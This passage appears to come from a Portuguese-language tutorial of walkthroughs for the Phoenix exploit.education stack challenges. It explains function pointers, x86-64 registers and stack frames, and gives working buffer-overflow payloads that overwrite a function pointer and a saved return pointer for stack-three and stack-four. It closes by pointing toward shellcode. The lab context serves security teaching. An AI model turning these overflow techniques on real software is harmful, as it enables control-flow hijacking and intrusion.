<p>&quot;a&quot; pode ser des-referenciada, isto √©: Seguir a dire√ß√£o que &quot;a&quot; aponta, para chegar no valor de &quot;b&quot; ! :D</p>
</blockquote>
<p>Normalmente, o caracteres &quot;&amp;&quot; indica uma refer√™ncia, e o caracteres &quot;*&quot; desreferencia aquele pointer.</p>
<blockquote>
<p>Caso voc√™ tente desrefenciar um pointer que n√£o aponta pra nada (NULL),
o programa vai interromper a execu√ß√£o e soltar uma mensagem de erro!
Ou vai ser classificado como &quot;comportamento indefinido&quot;! Por isso, voc√™ vai ver &quot;Null Checks&quot;
bem frequentemente nesses desafios e em programas em geral!</p>
</blockquote>
<a class="header" href="print.html#-function-pointers" id="-function-pointers"><h3>ü¶Ä Function Pointers</h3></a>
<blockquote>
<p>Function pointers, ao inv√©s de armazenar o endere√ßo de uma vari√°vel, armazenam o endere√ßo de uma fun√ß√£o! :D</p>
</blockquote>
<p>Sim! Fun√ß√µes tamb√©m s√£o armazenadas na Stack, e possuem seu endere√ßo! Esse endere√ßo pode ser encontrado por v√°rios m√©todos:</p>
<pre><code>objdump -d &lt;programa&gt; | grep &lt;nome_da_fun√ß√£o&gt;


gdb &lt;programa&gt;
  (gdb)&gt; info functions
</code></pre>
<p>Os dois m√©todos ser√£o demonstrados em breve! :D</p>
<a class="header" href="print.html#-exploit" id="-exploit"><h3>üî• Exploit</h3></a>
<blockquote>
<p>Buffer overflow, alterando o valor de um function pointer, redirecionando a execu√ß√£o do programa.</p>
<p>Em lingua n√£o nerd, por favor? :P</p>
<p>O valor que sera corrompido pelo buffer overflow indica aonde a execu√ß√£o do programa esta indo. Se controlamos esse valor, controlamos aonde o programa vai!</p>
</blockquote>
<a class="header" href="print.html#-analisando-o-programa" id="-analisando-o-programa"><h4>üõ∏ Analisando o programa</h4></a>
<pre><code class="language-C">fun√ß√£o complete_level() {   // a fun√ß√£o que a gente quer chamar
.......
}

fun√ß√£o main() {
  criar buffer[64];
  criar fp; // um function pointer
  
  fp = NULL; // vai ser usado para checar se ele foi alterado,
               // se continuar sendo NULL, quer dizer que esta intacto.
                
  
  gets(buffer) // fun√ß√£o INSEGURA para abrir um input
  
  if (fp) {    // se fp foi alterado
    fp()   // chama o endere√ßo salvo em fp como se fosse uma fun√ß√£o
  } else {
    print(valor nao alterado, tente novamente)
  }
  
  exit
}
</code></pre>
<p>N√≥s queremos chamar <code>complete_level()</code>, para isso, faremos <code>fp</code> salvar o seu endere√ßo.</p>
<p>E n√≥s j√° sabemos como exploitar um <code>gets()</code> para alterar os valores depois do <code>buffer</code>! Ent√£o t√° na hora do trabalho!</p>
<a class="header" href="print.html#-encontrando-o-endere√ßo-da-fun√ß√£o" id="-encontrando-o-endere√ßo-da-fun√ß√£o"><h4>üè† Encontrando o endere√ßo da fun√ß√£o</h4></a>
<pre><code>objdump -d    // Resumindo, printa pro terminal os objetos armazenados na Stack e seus endere√ßos
                  ( O -d √© pra ativar a disassembly: Converter de machine code para algo leg√≠vel )!
gdb
</code></pre>
<p>objdump</p>
<pre><code>$ objdump -d /opt/phoenix/amd64/stack-three | grep complete_level
000000000040069d &lt;complete_level&gt;:
</code></pre>
<p>gdb</p>
<pre><code class="language-x86asm">$ gdb /opt/phoenix/amd64/stack-three                
---- Mensagens padr√£o foram removidas ----
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004d0  printf@plt
0x00000000004004e0  gets@plt
0x00000000004004f0  puts@plt
0x0000000000400500  fflush@plt
0x0000000000400510  exit@plt
0x0000000000400520  __libc_start_main@plt
0x0000000000400530  _start
0x0000000000400546  _start_c
0x0000000000400570  deregister_tm_clones
0x00000000004005a0  register_tm_clones
0x00000000004005e0  __do_global_dtors_aux
0x0000000000400670  frame_dummy
0x000000000040069d  complete_level              // Mesmo endere√ßo
0x00000000004006b5  main
0x0000000000400740  __do_global_ctors_aux
0x0000000000400782  _fini
</code></pre>
<blockquote>
<p>O endere√ßo da fun√ß√£o √© 0x000000000040069d ! :D</p>
</blockquote>
<p>Presta aten√ß√£o na quantidade de null bytes que precedem o endere√ßo. Todo pointer come√ßa com pelo menos dois null bytes,
e strings terminam com 1 null byte!</p>
<p>Assim, impedindo atacantes (n√≥s), de definir um pointer novo, pois quebraria a string do nosso
input. N√≥s precisamos usar um que j√° esta na memoria! (  Spoiler hehehehe :D  )</p>
<p>Como nesse desafio o pointer ja existe (<code>fp</code>) e n√≥s s√≥ vamos mudar os bytes finais dele
(Inteiro escreve na dire√ß√£o LE, lembra? Ent√£o n√£o vai interferir com os NULLs que vem antes)</p>
<p>Portanto n√£o precisamos nos preocupar com isso nesse desafio!</p>
<a class="header" href="print.html#-cansei-de-teoria-eu-quero-exploit" id="-cansei-de-teoria-eu-quero-exploit"><h4>üòê Cansei de teoria eu quero exploit</h4></a>
<p>Se voc√™ quer tentar por conta pr√≥pria, agora √© sua hora de brilhar!</p>
<pre><code>Lembretes:
Little Endian, o buffer tem 64 bytes,
b&quot;\x&quot;, e o input vem pelo gets()
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
eai, brilhou? ;)
</code></pre>
<p>O input que vamos passar fica:
b&quot;A&quot;*64     # encher o buffer (<code>padding</code>) <br />
+ <br />
b&quot;\x9d\x06\x40&quot; # 0x40069d vira &quot;9d 06 40&quot; em LE</p>
<p>Ent√£o...</p>
<blockquote>
<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot;</p>
</blockquote>
<pre><code class="language-C">calling function pointer @ 0x40069d &lt;-- chamando complete_level()
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre>
<p>Espero que voc√™ tenha gostado! :D</p>
<a class="header" href="print.html#-solu√ß√£o-3" id="-solu√ß√£o-3"><h1>üî• Solu√ß√£o</h1></a>
<blockquote>
<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot; | /opt/phoenix/amd64/stack-three</p>
</blockquote>
<pre><code>calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre>
<a class="header" href="print.html#-objetivo-3" id="-objetivo-3"><h1>üéØ Objetivo</h1></a>
<p>O buffer overflow (<code>BOF</code>) vai nos permitir alterar o saved return pointer (<code>SRP</code>) e redirecionar a execu√ß√£o do programa.</p>
<p>Esse desafio est√° nos preparando para o pr√≥ximo, no qual nos redirecionaremos a execu√ß√£o para o nosso pr√≥prio c√≥digo, e teremos um exploit de verdade! :D</p>
<p>Esse tipo de exploit era vi√°vel nos anos 90, quando mecanismos de prote√ß√£o n√£o existiam. Por isso √© chamado de buffer overflow cl√°ssico (ou <code>SRP BOF</code>,
caso voc√™ goste de siglas)! :D</p>
<p>Se voc√™ souber ingl√™s, vale a pena dar uma lida nesse post de 1996 no Phrack: <a href="http://phrack.org/issues/49/14.html">Smashing The Stack For Fun And Profit</a> !</p>
<a class="header" href="print.html#-conhecimento-preliminar" id="-conhecimento-preliminar"><h1>üõ∏ Conhecimento preliminar</h1></a>
<p>Se tem uma se√ß√£o inteira dedicada a conhecimento preliminar, eu posso te garantir que vai ser BASTANTE ! Verifique que o cinto de seguran√ßa est√° firme e travado,
mantenha as m√£os, pernas e canecas de caf√© dentro do ve√≠culo durante todo o percurso!</p>
<p>3...2...1....</p>
<a class="header" href="print.html#-assembly" id="-assembly"><h2>ü§ñ Assembly</h2></a>
<p>Recursos adicionais: <br />
<a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&amp;ved=2ahUKEwiPvJn2xvrsAhXIILkGHdA4BNUQFjAAegQIARAB&amp;usg=AOvVaw384MVXQDBtyM1pPW3LeZrW">x64 Cheat Sheet - PDF</a> <br />
<a href="https://cs61.seas.harvard.edu/site/2018/Asm1/">Harvard CS61</a> <br />
<a href="https://en.m.wikipedia.org/wiki/Processor_register">Wikipedia Registers</a> <br />
<a href="https://www.tutorialspoint.com/general-purpose-registers-in-8086-microprocessor#:%7E:text=The%20general%20purpose%20registers%20are,has%20eight%20general%20purpose%20registers.&amp;text=This%20is%20the%20accumulator.,into%20two%208%2Dbit%20registers">GPR in 8086</a><br />
<a href="https://mentebinaria.gitbook.io/engenharia-reversa/assembly/registradores">Registadores - Introdu√ß√£o Engenharia Reversa</a> \</p>
<p>Eu pretendo fazer uma serie de tutorias dedicada √† assembly (ASM), por√©m isso √© para o futuro...</p>
<p>Eu vou usar sintaxe intel, pq √© a melhor e se algu√©m te disser o contr√°rio, a pessoa ta mentindo &gt;:( !!!!</p>
<blockquote>
<p>ASM √© uma representa√ß√£o leg√≠vel dos 0s e 1s das instru√ß√µes do computador.
Ela pode ser transformada em machine code (c√≥digo de maquina, os 0s e 1s) usando uma ferramenta chamada assembler!</p>
</blockquote>
<p>Ent√£o como voc√™ pode imaginar, √© bem complicado, e a minha maneira de explicar pode n√£o funcionar para voc√™... Ent√£o vai com calma, le de outras fontes, assiste
videos,... vai demorar um bom tempo ate ficar intuitivo, e ta tudo bem com isso :) vai no seu ritmo</p>
<a class="header" href="print.html#-register-registos--registadores" id="-register-registos--registadores"><h3>üì¶ Register (Registos / Registadores)</h3></a>
<blockquote>
<p>Registers s√£o peda√ßos de mem√≥ria que ficam dentro do chip do processador,
semelhante a mem√≥ria RAM, por√©m extremamente r√°pidos e pequenos.</p>
</blockquote>
<p>O seu tamanho √© um dos determinantes da arquitetura (32 bits = register de
4 bytes, 64 bits = register de 8 bytes)</p>
<p>Esses registers s√£o semelhantes √† vari√°veis, no sentido que
armazenam valores, podem ser alterados e lidos.</p>
<a class="header" href="print.html#-general-purpose-registers-gpr--registo-de-prop√≥sito-geral-" id="-general-purpose-registers-gpr--registo-de-prop√≥sito-geral-"><h4>üåç General Purpose Registers (GPR) ( Registo de Prop√≥sito Geral )</h4></a>
<p>Obs: muitos desses podem ser divididos em 2 partes, com metade do tamanho original. Nesse caso, se adiciona o sufixo H (High, A parte de cima) e L (Low, A parte de baixo).</p>
<blockquote>
<p>Por exemplo: AX (16 bits, endere√ßos: 0 a 15) (uma vers√£o antiga do RAX) pode ser dividido em AL (8 bits, do 0 ao 7) e AH (8 bits, do 8 ao 15).</p>
</blockquote>
<p>O prop√≥sito deles historicamente costumava ser, mas n√£o exclusivamente era:</p>
<pre><code class="language-x86asm">RAX Acumulador   -&gt; Usado para opera√ß√µes_l√≥gicas ou aritm√©ticas 
RBX              -&gt; Pointer para dados
RCX Contagem     -&gt; Usado em loops e outras opera√ß√µes_c√≠clicas 
RDX Dados        -&gt; Multiplica√ß√£o, input/output
R8 a 15          -&gt; voc√™ s√≥ precisa saber que eles existem
</code></pre>
<p>Alem disso, s√£o usados para passar os argumentos para fun√ß√µes (explica√ß√£o em breve)</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1¬∫ par√¢metro)
RSI (2¬∫ par√¢metro)
RDX (3¬∫ par√¢metro)
...
</code></pre>
<p>Para os nossos prop√≥sitos, √© mais vantajoso considerar que eles s√≥ servem para
armazenar valores e passar argumentos</p>
<a class="header" href="print.html#-address-register--armazenam-endere√ßos-da-stack-" id="-address-register--armazenam-endere√ßos-da-stack-"><h4>üí´ Address Register ( armazenam endere√ßos da stack )</h4></a>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instru√ß√£o 
                                que est√° sendo executada 
</code></pre>
<a class="header" href="print.html#-rflag" id="-rflag"><h4>üèÅ RFLAG</h4></a>
<p>O register RFLAG armazena flags: sinais que indicam resultados de opera√ß√µes passadas.
Esses sinais s√£o 1 bit (0 ou 1)</p>
<pre><code>Exemplos:

Posi√ß√£o    Nome         Descri√ß√£o 
0          Carry         Resultado estourou o limite de um inteiro
                                sem sinal (o &quot;vai-um&quot; da matem√°tica)
6          Zero          A opera√ß√£o resultou em 0
11         Overflow      Estourou o limite de um inteiro com sinal
</code></pre>
<a class="header" href="print.html#-ap√™ndice---curiosidade--nomenclatura-hist√≥rica" id="-ap√™ndice---curiosidade--nomenclatura-hist√≥rica"><h4>üß† Ap√™ndice - Curiosidade : Nomenclatura hist√≥rica</h4></a>
<p><img src="./img/registers.jpeg" alt="Imagem mostrando os registers" /> <br />
Eu vou usar o RAX como exemplo!</p>
<pre><code class="language-x86asm">Em computadores 8 bits, ele era chamado A (Acumulador)
Em computadores 16 bits, ele era chamado AX (Acumulador eXtendido ) 
Em computadores 32 bits, ele era chamado EAX e tem o tamanho de 2 AX
Em computadores 64 bits, ele √© chamado RAX e tem o tamanho de 2 EAX

Para prop√≥sitos de retro-compatibilidade, nos ainda podemos usar, 
por exemplo, EAX em um computador 64 bits !
Por tr√°s das cenas, o computador interpreta EAX como a segunda metade do RAX

Ent√£o n√£o estranhe caso algu√©m fale de EIP numa
arquitetura x64, pois na linguagem informal n√£o faz diferen√ßa

Mas caso voc√™ v√° analisar o register em um debugger, a diferen√ßa importa :D
</code></pre>
<a class="header" href="print.html#-instru√ß√µes" id="-instru√ß√µes"><h3>‚ö° Instru√ß√µes</h3></a>
<blockquote>
<p>Obs: os registers foram usados aleatoriamente, pois seu prop√≥sito na realidade n√£o √© relevante para a explica√ß√£o !</p>
</blockquote>
<p>As instru√ß√µes s√£o o que o processador executa, por exemplo</p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adi√ß√£o 4 + 1 = 5
</code></pre>
<p>Na sintaxe intel, o &quot;alvo&quot; da opera√ß√£o vem primeiro e o &quot;par√¢metro&quot; depois</p>
<p>Caso os dois argumentos da instru√ß√£o sejam valores, a opera√ß√£o executara normalmente</p>
<p>Caso o <strong>alvo</strong> seja um <strong>register</strong>, o <strong>resultado</strong> da opera√ß√£o ser√° salvo nele</p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adi√ß√£o 4 + 1 = 5
add rbp 0x10    -&gt; rbp  vira  rbp + 0x10
add rbp 0x22    -&gt; Adiciona 0x22 ao rbp 
</code></pre>
<pre><code class="language-x86asm">sub 0x4 0x1     -&gt; subtra√ß√£o 4 - 1 = 3
                 Caso fosse ao contr√°rio a ordem &quot;alvo&quot; &quot;par√¢metro&quot;,
                 o resultado seria `-3` !
                 
sub rbp 0x10    -&gt; rbp  vira  rbp - 0x10
sub rsp 0x10    -&gt; Subtrai 0x10 de rsp
</code></pre>
<p>Algumas outras instru√ß√µes que ser√£o importantes</p>
<pre><code class="language-x86asm">push -&gt; Empurra o valor pro topo da Stack

pop  -&gt; Tira o valor no topo da Stack e salva no alvo
     |---&gt; pop      -&gt; S√≥ remove o valor no topo da Stack
     |---&gt; pop rbp  -&gt; Remove o valor do topo e salva em rbp
      
mov  -&gt; Move o valor do par√¢metro para o alvo
     |---&gt; mov rbx 0x10   -&gt; O valor de rbx vira 0x10
     |---&gt; mov rbx rax    -&gt; O valor de rbx vira o valor de rax
     |---&gt; mov rax rbx    -&gt; O valor de rax vira o valor de rbx

Usadas no ep√≠logo ( explicadas em breve )
           ret     -&gt; retorna da fun√ß√£o ( em ess√™ncia √© s√≥ um &quot;pop rip&quot; )
           leave -&gt; restaura o stack frame anterior ( mov rsp rbp ; pop rbp )

xor, and, ......  -&gt; Operadores l√≥gicos, t√™m o mesmo comportamento de sub e add
                  |---&gt; and rbp 0x10   -&gt; rbp  vira  rbp &amp; 0x10
                  |---&gt; xor rsp 0x10   -&gt; rsp  vira  rsp ^ 0x10

Jumps/Pulos
jmp 0x00001234 -&gt; Move o RIP para aquela localiza√ß√£o incondicionalmente,
            equivalente a um GOTO

test rax 0x1 ; jmpEQ 0x00001234 -&gt; jmp equal
             |---&gt; Compara os valores; Se forem iguais da o jump
             (normalmente usado em conjunto com a ZERO_FLAG)

jmple  -&gt; jmp less or equal   -&gt; Menor ou igual   ‚â§
jmpge -&gt; jmp greater or equal -&gt; Maior ou igual   ‚â•
</code></pre>
<p>Caso vc n√£o saiba os operadores l√≥gicos: <a href="https://pt.wikipedia.org/wiki/Operador_l%C3%B3gico">Wikipedia Operador L√≥gico</a></p>
<a class="header" href="print.html#-fun√ß√µes-pr√≥logo-e-ep√≠logo" id="-fun√ß√µes-pr√≥logo-e-ep√≠logo"><h3>ü¶Ñ Fun√ß√µes, Pr√≥logo e Ep√≠logo</h3></a>
<p>Agora t√° na hora de aprender <strong>realmente</strong> como essa tal de stack funciona, ent√£o √© bom dar uma revisada, n√©?</p>
<a class="header" href="print.html#-revis√£o" id="-revis√£o"><h4>‚òï Revis√£o</h4></a>
<pre><code>- A stack √© como uma pilha de pratos: √∫ltimo a entrar, primeiro a sair (LIFO)
- Ela cresce para valores menores: 
    - A mem√≥ria √© representada de cabe√ßa pra baixo!
    - A base fica em um endere√ßo maior (parte de baixo)
    - O topo fica em um endere√ßo menor (parte de cima)
    - Portanto, a stack cresce em dire√ß√£o √† valores menores :D 

</code></pre>
<a class="header" href="print.html#-stack-frame--moldura-da-stack-" id="-stack-frame--moldura-da-stack-"><h4>üñºÔ∏è Stack Frame ( Moldura da Stack )</h4></a>
<p>Voc√™ se lembra do RBP e RSP la da parte dos register? Eles ficam importantes agora! :D</p>
<p>O rbp indica a base da stack, e rsp o topo.</p>
<p>A regi√£o entre os dois √© chamada de stack frame: um peda√ßo da stack :D</p>
<p>A stack como um todo possui v√°rios stack frames, por√©m s√≥ um est√° ativo por vez (o indicado pelo rbp/rsp).</p>
<p>Para poder criar um novo ou destruir um antigo, existem procedimentos chamados Pr√≥logo e Ep√≠logo, respectivamente.</p>
<blockquote>
<p>Obs: Quando voc√™ muda o tamanho da stack por push/pop, o RSP se ajusta automaticamente</p>
</blockquote>
<p>Quando chamamos uma <strong>fun√ß√£o()</strong>, precisamos criar um frame novo para ela por meio de um Pr√≥logo, e salvar o endere√ßo do frame atual. Ao retornar, esse frame ser√° destru√≠do com um Ep√≠logo e o antigo ser√° restaurado !</p>
<p>Para a explica√ß√£o, vamos usar o seguinte pseudo-programa:</p>
<pre><code class="language-C">Fn print_dois(x, y) {
    print(x)
    print(y)

    return
}
Fn main() {
    x = &quot;Ola! :D&quot;
    y = &quot;Assembly √© legal&quot;

    print_dois(x, y)

    return
}
</code></pre>
<p>Agora vamos executar <strong>main()</strong>, <strong>x</strong> e <strong>y</strong> s√£o definidas e nos j√° sabemos como isso funciona, agora vamos chamar a fun√ß√£o, que √© aonde a m√°gica acontece !</p>
<a class="header" href="print.html#-pr√≥logo" id="-pr√≥logo"><h4>üîí Pr√≥logo</h4></a>
<ul>
<li>Se a fun√ß√£o receber argumentos, passar eles
Chamar a fun√ß√£o</li>
<li>Salvar o frame atual</li>
<li>Criar novo frame
Executar a fun√ß√£o</li>
</ul>
<a class="header" href="print.html#se-a-fun√ß√£o-receber-argumentos-salvar-eles" id="se-a-fun√ß√£o-receber-argumentos-salvar-eles"><h5>Se a fun√ß√£o receber argumentos, salvar eles</h5></a>
<p>Algumas arquiteturas passam os argumentos pela stack, salvando-os na stack na ordem inversa:</p>
<pre><code class="language-x86asm">(x, y)
push y
push x
</code></pre>
<p>Mas comumente, os argumentos s√£o passados pelos registers:</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1¬∫ par√¢metro)
RSI (2¬∫ par√¢metro)
RDX (3¬∫ par√¢metro)
...
</code></pre>
<blockquote>
<p>Caso <strong>main()</strong> use um desses registers para armazenar dados para uso futuro, vai ser necess√°rio dar um push neles, e restaura-los no epilogo</p>
</blockquote>
<a class="header" href="print.html#salvar-o-frame-atual" id="salvar-o-frame-atual"><h4>Salvar o frame atual</h4></a>
<pre><code class="language-x86asm">push RIP + 0x4 ; salva o RIP na stack, por√©m n√£o o valor atual,
           ; e sim o endere√ßo da pr√≥xima instru√ß√£o 
push RBP       ; salva o RBP
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">rbp main            &lt;- RSP   -
rip main                     | Frame de
....                         | main()
ret de main         &lt;- RBP   -
</code></pre>
<a class="header" href="print.html#criar-novo-frame" id="criar-novo-frame"><h4>Criar novo frame</h4></a>
<p>Agora, para criar um novo frame, precisamos subir o rbp at√© o rsp</p>
<pre><code class="language-x86asm">mov rbp rsp ; Move o valor de rsp para rbp!
            ; Ou melhor : rbp &quot;anda&quot; at√© o rsp
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">rbp main    &lt;- RSP  e RBP apontam para a mesma localiza√ß√£o
rip main                   
... stack frame de main omitido           
</code></pre>
<p>Agora, precisamos <strong>subtrair</strong> de RSP para alocar espa√ßo na mem√≥ria para essa fun√ß√£o</p>
<blockquote>
<p>A stack cresce para valores menores :)</p>
</blockquote>
<pre><code class="language-x86asm">sub rsp - 0x20 ; vamos supor que, para esse exemplo, a fun√ß√£o precisa de 32 bytes.
               ; Portanto, vamos subtrair 32 bytes de RSP, para faze-lo &quot;subir&quot;
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Vari√°veis de print_dois  |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
...              
</code></pre>
<p>Com esse m√©todo de chamar fun√ß√£o, n√£o importa a localiza√ß√£o da mem√≥ria de quando a fun√ß√£o foi chamada, ela sempre vai executar da mesma maneira</p>
<blockquote>
<p>Esse processo pode ocorrer muitas vezes caso uma fun√ß√£o chame outra, no nosso exemplo, um novo frame seria criado para <strong>print()</strong>, print seria executada,
e o frame destru√≠do ao retornar. Apos <strong>print()</strong> retornar, <strong>print_dois continuara a execu√ß√£o normalmente! :)</strong></p>
</blockquote>
<pre><code class="language-x86asm">O prologo ent√£o pode ser resumido em

salvar vars
call
  push rip
  push rbp
  mov rbp rsp
  sub rsp 0x1234
  executar a fun√ß√£o
</code></pre>
<a class="header" href="print.html#-ep√≠logo" id="-ep√≠logo"><h4>üîë Ep√≠logo</h4></a>
<p>O epilogo √© bem mais simples que o prologo:</p>
<pre><code>- Devolver memoria e restaurar RBP    -&gt; leave   
- Restaurar RIP  e retornar           -&gt; ret
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Instru√ß√µes               |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
            
</code></pre>
<p><strong>leave</strong></p>
<p>Para devolver a memoria, precisamos mover RSP &quot;para baixo: basta dar um <code>mov rsp rbp</code> (&quot;andar&quot; rsp at√© o rbp)</p>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">...                    
Vari√°veis print dois   A regi√£o n√£o √© apagada, pois consumiria processamento a toa!
...         O valores ficam largados l√° at√© uma nova fun√ß√£o escrever por cima deles..
...         Por isso que, ao analisar a stack, as vezes vemos &quot;lixo&quot; aleat√≥rio
...         Eles pode ser ignorado pois nem est√° mais na stack
                          
rbp main  &lt;- RBP e RSP - O topo da stack
rip main                                
</code></pre>
<p>Em seguida, vamos restaurar o rbp de main <code>pop rbp</code>
(remover o valor no topo da stack (ver acima por referencia), e coloca-lo no alvo: <strong>rbp</strong>)</p>
<pre><code class="language-x86asm">--- omitido ---
rip main      &lt;- RSP   (lembrando que RSP se ajusta automaticamente com push/pop)
...
... main
call print_dois
proxima instru√ß√£o
... resto de main
ret de main   &lt;- RBP
</code></pre>
<p><strong>ret (return)</strong>
ret vai restaurar o EIP de main com um <code>pop rip</code></p>
<pre><code class="language-x86asm">...
...resto de main  &lt;- RSP
call print_dois
proxima instru√ß√£o &lt;- RIP
... resto de main
ret da main       &lt;- RBP
</code></pre>
<p>Assim, o stack frame de main foi restaurado gra√ßas ao rbp e rip salvos ( o rip salvo √© chamado de <strong>Saved Return Pointer (SRP)</strong> )</p>
<a class="header" href="print.html#-caso-voc√™-tenha-viajado-o-que-voc√™-precisa-saber" id="-caso-voc√™-tenha-viajado-o-que-voc√™-precisa-saber"><h1>üåç Caso voc√™ tenha viajado, o que voc√™ precisa saber</h1></a>
<p>Existem algumas vari√°veis especiais dentro do processador:</p>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instru√ß√£o que est√° sendo executada 
</code></pre>
<p>O RIP e o RBP atuais s√£o salvos na stack quando chamamos uma fun√ß√£o, junto das outras vari√°veis:</p>
<pre><code class="language-x86asm">buffer[64]
uns int qualquer usado na fun√ß√£o
....
rbp
rip
</code></pre>
<p>Se por um buffer overflow conseguimos alterar aqueles inteiros depois do buffer, como <code>changeme</code> nos exerc√≠cios anteriores, tamb√©m conseguimos
alterar o RIP salvo (<code>SRP</code>) e redirecionar a execu√ß√£o do programa!</p>
<a class="header" href="print.html#-exploit-1" id="-exploit-1"><h1>üî• Exploit</h1></a>
<a class="header" href="print.html#-analisar-o-programa" id="-analisar-o-programa"><h2>üî¨ Analisar o programa</h2></a>
<p>O programa contem 3 fun√ß√µes: <code>complete_level</code>, <code>start_level</code> e <code>main</code></p>
<p><code>main</code> printa a mensagem do come√ßo do n√≠vel e chama start_level</p>
<p><code>complete_level</code> √© a fun√ß√£o que precisamos chamar</p>
<p><code>start_level</code> √© onde a magica acontece: <code>gets()</code> (vulner√°vel) √© chamada num <code>buffer[64]</code></p>
<a class="header" href="print.html#-o-compilador-adicionou-coisa" id="-o-compilador-adicionou-coisa"><h2>‚ÅâÔ∏è O compilador adicionou coisa???</h2></a>
<p>Se colocarmos somente um byte:</p>
<pre><code class="language-bash">$ ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
A
and will be returning to 0x40068d
</code></pre>
<p>A fun√ß√£o normalmente retorna para 0x40068d !</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*80&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d
Segmentation fault
</code></pre>
<p>Nos colocamos mais de 64 bytes (80), e conseguimos dar overflow... mas o rip n√£o mudou e mesmo assim teve seg fault.... QUE?!!!!</p>
<p>O compilador muitas vezes coloca coisas na stack por performance ou compatibilidade!</p>
<p>Alem disso, nos exemplos passados o valor que queremo mudar estava logo depois do buffer, agora tem pelo menos o RBP salvo no meio do caminho!
Ent√£o precisamos levar isso em considera√ß√£o, n√£o basta s√≥ olhar que o tamanho do buffer √© 64 e colocar 64 bytes de <code>padding</code>!</p>
<p>Em aplica√ß√µes mais complexas, essa diferen√ßa pode chegar a centenas de bytes.</p>
<p>Nos podemos encontrar essa diferen√ßa usando ferramentas como fuzzers ou geradores de padr√£o...</p>
<p>Como nosso exemplo √© simples, podemos aumentar/diminuir manualmente ate encontrar o valor certo:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*89&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x41
Segmentation fault

$ python -c &quot;print 'A'*88&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x400000
Segmentation fault
</code></pre>
<p>Isso quer dizer que apo≈õ <strong>88</strong> bytes, temos o SRP :D</p>
<a class="header" href="print.html#-encontrar-endere√ßo-de-complete_level" id="-encontrar-endere√ßo-de-complete_level"><h2>üè† Encontrar endere√ßo de complete_level</h2></a>
<p>Voc√™ se lembra como faz? Nos usamos no exerc√≠cio passado....</p>
<blockquote>
<p>cof cof objdump -d cof cof</p>
</blockquote>
<pre><code>Se vc quer tentar sozinhx, agora √© a sua hora
.
.
.
.
.
.
.
.
.
.
.
.
.
Eai, conseguiu?
</code></pre>
<p>Encontrar endere√ßo:</p>
<pre><code class="language-x86asm">$ objdump -d stack-four | grep complete_level
000000000040061d &lt;complete_level&gt;:
</code></pre>
<p>Exploit:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<p>Esse foi um tutorial beeem longo, e com certeza o mais dif√≠cil! Se voc√™ chegou at√© aqui, parab√©ns! :D</p>
<a class="header" href="print.html#-solu√ß√£o-4" id="-solu√ß√£o-4"><h1>üí´ Solu√ß√£o</h1></a>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<a class="header" href="print.html#-objetivo-4" id="-objetivo-4"><h1>üéØ Objetivo</h1></a>
<p>Finalmente! Tudo isso para chegar no BOF SRP (cl√°ssico) :D</p>
<p>Agora ta na hora de redirecionar o pointer para o nosso c√≥digo malicioso (shellcode) para ganhar uma shell</p>
<a class="header" href="print.html#-dicas-1" id="-dicas-1"><h1>üí° Dicas</h1></a>
<p>A instru√ß√£o <code>0xCC</code> (<code>int3</code>) serve para no debugger (como o gdb), para quando o rip chegar nela, a execu√ß√£o pausar (<code>breakpoint</code>). Nos podemos usa-la para testar se
sequer conseguimos executar c√≥digo, ou se o problema ta no shellcode: Se o debugger avisa que teve <code>SIGTRAP</code>, nos temos execu√ß√£o de c√≥digo :D</p>
<p>Banco de dados de shellcode: <a href="http://shell-storm.org/shellcode/files/">shell-storm</a></p>
<a class="header" href="print.html#-exploit-2" id="-exploit-2"><h1>üî• Exploit</h1></a>
<a class="header" href="print.html#analisando-o-programa" id="analisando-o-programa"><h2>Analisando o programa</h2></a>
<p><code>main()</code> printa o banner e chama <code>start_level()</code></p>
<p><code>start_level()</code> cria um buffer[<strong>128</strong>] e salva o output de <code>gets()</code> (<strong>inseguro</strong>)</p>
<p>Como voc√™ pode ver, n√£o existe <code>complete_level()</code></p>
